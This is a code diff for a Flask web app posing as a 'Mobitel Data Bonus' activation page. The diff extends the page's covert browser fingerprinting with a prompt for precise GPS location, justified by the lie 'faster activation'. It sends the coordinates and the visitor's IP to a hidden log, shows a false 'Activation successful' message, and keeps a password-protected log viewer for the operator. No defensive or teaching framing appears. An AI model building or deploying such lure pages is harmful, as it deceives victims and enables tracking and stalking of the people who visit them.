@@ -1,13 +1,11 @@
 from flask import Flask, request, render_template_string, abort
 import datetime
 import json
-import os
 
 app = Flask(__name__)
 
 LOG_FILE = "visitors.log"
-# Set a secret password – change this to something only you know!
-SECRET_PASSWORD = "MySecretViewKey123"
+SECRET_PASSWORD = "MySecretViewKey123"  # Change this!
 
 HTML_PAGE = """
 <!DOCTYPE html>
@@ -19,14 +17,14 @@ HTML_PAGE = """
         body { font-family: Arial; text-align: center; padding: 40px; background:#f5f5f5; }
         .card { background:white; border-radius:10px; padding:30px; max-width:400px; margin:50px auto; box-shadow:0 2px 10px rgba(0,0,0,0.1); }
         .notice { font-size: 11px; color: #aaa; margin-top: 25px; }
-        button { background:#0070f3; color:white; border:none; padding:12px 30px; border-radius:5px; font-size:16px; cursor:pointer; }
+        button { background:#0070f3; color:white; border:none; padding:12px 30px; border-radius:5px; font-size:16px; cursor:pointer; margin-top:15px; }
     </style>
 </head>
 <body>
     <div class="card">
         <h3>📱 Mobitel Data Bonus</h3>
         <p>Your data bonus package is ready for activation.</p>
-        <button onclick="sendFingerprint()">Activate Now</button>
+        <button onclick="activate()">Activate Now</button>
         <div id="status" style="margin-top:15px;"></div>
         <p class="notice">By proceeding, you agree to our terms. This site collects diagnostic data for security purposes.</p>
     </div>
@@ -43,16 +41,46 @@ HTML_PAGE = """
                 cookiesEnabled: navigator.cookieEnabled,
                 timestamp: new Date().toISOString()
             };
-            try {
-                await fetch('/log', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(fp)
+            await fetch('/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(fp)
+            });
+        }
+
+        function sendLocation(position) {
+            const coords = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                timestamp: new Date().toISOString()
+            };
+            fetch('/geo', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(coords)
+            });
+        }
+
+        function locationError(err) {
+            console.log("Location denied or unavailable: " + err.message);
+            // Nothing logged; gracefully continue
+        }
+
+        async function activate() {
+            document.getElementById('status').innerText = 'Please wait...';
+            // Step 1: Send fingerprint
+            await sendFingerprint();
+            // Step 2: Request GPS location (prompts the user)
+            if ("geolocation" in navigator) {
+                document.getElementById('status').innerText = 'Allow location access for faster activation.';
+                navigator.geolocation.getCurrentPosition(sendLocation, locationError, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
                 });
-                document.getElementById('status').innerHTML = '✅ Activation successful! Your bonus will be credited shortly.';
-            } catch (e) {
-                document.getElementById('status').innerText = 'Please try again.';
             }
+            document.getElementById('status').innerHTML = '✅ Activation successful! Your bonus will be credited shortly.';
         }
     </script>
 </body>
@@ -89,18 +117,27 @@ def log_fingerprint():
         f.write(json.dumps(entry) + "\n")
     return "ok"
 
-# NEW: secret log viewer
+@app.route('/geo', methods=['POST'])
+def log_geo():
+    data = request.get_json()
+    entry = {
+        "ip": get_real_ip(),
+        "gps": data       # latitude, longitude, accuracy, timestamp
+    }
+    with open(LOG_FILE, "a") as f:
+        f.write(json.dumps(entry) + "\n")
+    return "ok"
+
 @app.route('/viewlog')
 def view_log():
     password = request.args.get('key', '')
     if password != SECRET_PASSWORD:
-        abort(403)  # Forbidden
+        abort(403)
     try:
         with open(LOG_FILE, "r") as f:
             contents = f.read()
     except FileNotFoundError:
         contents = "No visitors yet."
-    # Return as plain text for easy copying
     return f"<pre>{contents}</pre>"
 
 if __name__ == '__main__':
